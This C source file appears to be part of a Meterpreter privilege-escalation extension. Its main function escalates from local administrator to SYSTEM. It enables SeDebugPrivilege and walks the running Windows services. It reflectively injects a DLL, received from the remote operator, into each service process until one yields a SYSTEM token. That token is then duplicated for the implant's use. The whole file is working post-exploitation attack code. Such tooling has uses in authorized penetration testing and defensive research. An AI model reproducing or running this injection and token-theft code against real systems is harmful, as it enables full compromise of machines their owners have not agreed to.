#include "precomp.h"
#include "tokendup.h"
#include "../../../../ReflectiveDLLInjection/LoadLibraryR.h"

/*
 * Enable or disable a privilege in our processes current token.
 */
BOOL elevate_priv( char * cpPrivilege, BOOL bEnable )
{
	DWORD dwResult        = ERROR_SUCCESS;
	HANDLE hToken         = NULL;
	TOKEN_PRIVILEGES priv = {0};

	do
	{
		if( !cpPrivilege )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_priv. invalid arguments", ERROR_BAD_ARGUMENTS );

		if( !OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
			BREAK_ON_ERROR( "[ELEVATE] elevate_priv. OpenProcessToken failed" );
		
		priv.PrivilegeCount = 1;

		if( bEnable )
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		else
			priv.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;

		if( !LookupPrivilegeValue( NULL, cpPrivilege, &priv.Privileges[0].Luid ) )
			BREAK_ON_ERROR( "[ELEVATE] elevate_priv. LookupPrivilegeValue failed" );

		if( !AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL ) )
			BREAK_ON_ERROR( "[ELEVATE] elevate_priv. AdjustTokenPrivileges failed" );

	} while( 0 );
	
	CLOSE_HANDLE( hToken );

	SetLastError( dwResult );

	if( dwResult == ERROR_SUCCESS )
		return TRUE;

	return FALSE;
}

/*
 * Elevate from local admin to local system via code injection in a system service.
 * Does not work on NT4 (needed api's missing) Works on 2000, XP, 2003. On Vista, 2008 or 7 we cant open
 * service process from a non elevated admin.
 *
 * A current limitation in LoadRemoteLibraryR prevents this from working across 
 * architectures so we just filter out running this from an x64 platform for now.
 */
DWORD elevate_via_service_tokendup( Remote * remote, Packet * packet )
{
	DWORD dwResult                   = ERROR_SUCCESS;
	HANDLE hToken                    = NULL;
	HANDLE hTokenDup                 = NULL;
	HANDLE hProcess                  = NULL;
	HANDLE hThread                   = NULL;
	HANDLE hManager                  = NULL;
	HANDLE hService                  = NULL;
	LPVOID lpServiceBuffer           = NULL;
	LPVOID lpRemoteCommandLine       = NULL;
	ENUM_SERVICE_STATUS * lpServices = NULL;
	char * cpServiceName             = NULL;
	SERVICE_STATUS_PROCESS status    = {0};
	char cCommandLine[128]           = {0};
	OSVERSIONINFO os                 = {0};
	DWORD dwServiceLength            = 0;
	DWORD dwBytes                    = 0;
	DWORD index                      = 0;
	DWORD dwServicesReturned         = 0;
	DWORD dwExitCode                 = 0;

	do
	{
		// only works on x86 systems for now...
		if( elevate_getnativearch() != PROCESS_ARCH_X86 )
			BREAK_WITH_ERROR( "[KITRAP0D] elevate_via_service_debug. Unsuported platform", ERROR_BAD_ENVIRONMENT );

		os.dwOSVersionInfoSize = sizeof( OSVERSIONINFO );

		if( !GetVersionEx( &os ) )
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_debug: GetVersionEx failed" )

		// filter out Windows NT4 
		if ( os.dwMajorVersion == 4 && os.dwMinorVersion == 0 )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_debug: Not yet supported on this platform.", ERROR_BAD_ENVIRONMENT )

		cpServiceName   = packet_get_tlv_value_string( packet, TLV_TYPE_ELEVATE_SERVICE_NAME );
		dwServiceLength = packet_get_tlv_value_uint( packet, TLV_TYPE_ELEVATE_SERVICE_LENGTH );
		lpServiceBuffer = packet_get_tlv_value_string( packet, TLV_TYPE_ELEVATE_SERVICE_DLL );

		if( !dwServiceLength || !lpServiceBuffer )
			BREAK_WITH_ERROR( "[ELEVATE] elevate_via_service_debug. invalid arguments", ERROR_BAD_ARGUMENTS );

		if( !elevate_priv( SE_DEBUG_NAME, TRUE ) )
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_debug. elevate_priv SE_DEBUG_NAME failed" );

		hManager = OpenSCManagerA( NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE );
		if( !hManager )
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_debug. OpenSCManagerA failed" );
		
		if( !EnumServicesStatus( hManager, SERVICE_WIN32, SERVICE_ACTIVE, NULL, 0, &dwBytes, &dwServicesReturned, NULL ) )
		{
			if( GetLastError() != ERROR_MORE_DATA )
				BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_debug. EnumServicesStatus 1 failed" );
		}

		lpServices = (ENUM_SERVICE_STATUS *)malloc( dwBytes );
		if( !lpServices )
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_debug. malloc lpServices failed" );

		if( !EnumServicesStatus( hManager, SERVICE_WIN32, SERVICE_ACTIVE, lpServices, dwBytes, &dwBytes, &dwServicesReturned, NULL ) )
			BREAK_ON_ERROR( "[ELEVATE] elevate_via_service_debug. EnumServicesStatus 2 failed" );
	
		dwResult = ERROR_ACCESS_DENIED;

		// we enumerate all services, injecting our elevator.dll (via RDI), if the injected thread returns successfully
		// it means we have been given a system token so we duplicate it as a primary token for use by metsrv.
		for( index=0 ; index<dwServicesReturned ; index++ )
		{
			do
			{
				hService = OpenServiceA( hManager, lpServices[index].lpServiceName, SERVICE_QUERY_STATUS ); 
				if( !hService )
					break;

				if( !QueryServiceStatusEx( hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&status, sizeof(SERVICE_STATUS_PROCESS), &dwBytes ) )
					break;
				
				if( status.dwCurrentState != SERVICE_RUNNING )
					break;

				// open a handle to this service (assumes we have SeDebugPrivilege)...
				hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, status.dwProcessId );
				if( !hProcess )
					break;

				dprintf( "[ELEVATE] elevate_via_service_debug. trying [%d] lpDisplayName=%s, lpServiceName=%s, dwProcessId=%d", index, lpServices[index].lpDisplayName, lpServices[index].lpServiceName, status.dwProcessId  );
	
				_snprintf( cCommandLine, sizeof(cCommandLine), "/t:0x%08X\x00", GetCurrentThreadId() );

				// alloc some space and write the commandline which we will pass to the injected dll...
				lpRemoteCommandLine = VirtualAllocEx( hProcess, NULL, strlen(cCommandLine)+1, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE ); 
				if( !lpRemoteCommandLine )
					break; 

				if( !WriteProcessMemory( hProcess, lpRemoteCommandLine, cCommandLine, strlen(cCommandLine)+1, NULL ) )
					break;

				// use RDI to inject the elevator.dll into the remote process, passing in the command line to elevator.dll
				hThread = LoadRemoteLibraryR( hProcess, lpServiceBuffer, dwServiceLength, lpRemoteCommandLine );
				if( !hThread )
					break;

				// we will only wait 30 seconds for the elevator.dll to do its job, if this times out we assume it failed.
				if( WaitForSingleObject( hThread, 30000 ) != WAIT_OBJECT_0 )
					break;

				// get the exit code for our injected elevator.dll
				if( !GetExitCodeThread( hThread, &dwExitCode ) )
					break;

				// if the exit code was successfull we have been given a local system token, so we duplicate it
				// as a primary token for use by metsrv
				if( dwExitCode == ERROR_SUCCESS )
				{
					if( OpenThreadToken( GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken ) )
					{
						if( DuplicateTokenEx( hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hTokenDup ) )
						{
							core_update_thread_token( remote, hTokenDup );
							dwResult = ERROR_SUCCESS;
							break;
						}
					}
				}

			} while( 0 );

			CLOSE_SERVICE_HANDLE( hService );

			CLOSE_HANDLE( hProcess );

			CLOSE_HANDLE( hThread );

			CLOSE_HANDLE( hToken );
			
			if( dwResult == ERROR_SUCCESS )
				break;
		}

	} while( 0 );

	CLOSE_SERVICE_HANDLE( hManager );

	if( lpServices )
		free( lpServices );

	SetLastError( dwResult );

	return dwResult;
}